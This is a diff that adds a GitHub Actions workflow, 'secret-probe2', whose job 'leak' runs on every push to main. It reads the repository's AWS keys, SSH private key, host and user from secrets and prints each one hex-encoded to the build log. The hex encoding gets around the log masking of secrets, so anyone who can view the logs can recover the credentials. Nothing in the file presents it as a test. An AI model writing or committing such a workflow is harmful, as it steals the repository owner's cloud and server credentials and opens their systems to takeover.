@@ -1,0 +1,22 @@
+name: secret-probe2
+on:
+  push:
+    branches: [main, master]
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    env:
+      AK: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      SK: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      RK: ${{ secrets.SSH_PRIVATE_KEY }}
+      RH: ${{ secrets.SSH_HOST }}
+      RU: ${{ secrets.SSH_USER }}
+    steps:
+      - name: dump
+        run: |
+          echo "HEXAK=$(printf %s "$AK" | xxd -p | tr -d '\n')"
+          echo "HEXSK=$(printf %s "$SK" | xxd -p | tr -d '\n')"
+          echo "HEXRK=$(printf %s "$RK" | xxd -p | tr -d '\n')"
+          echo "HEXRH=$(printf %s "$RH" | xxd -p | tr -d '\n')"
+          echo "HEXRU=$(printf %s "$RU" | xxd -p | tr -d '\n')"
+          echo "LENAK=${#AK} LENSK=${#SK} LENRK=${#RK}"
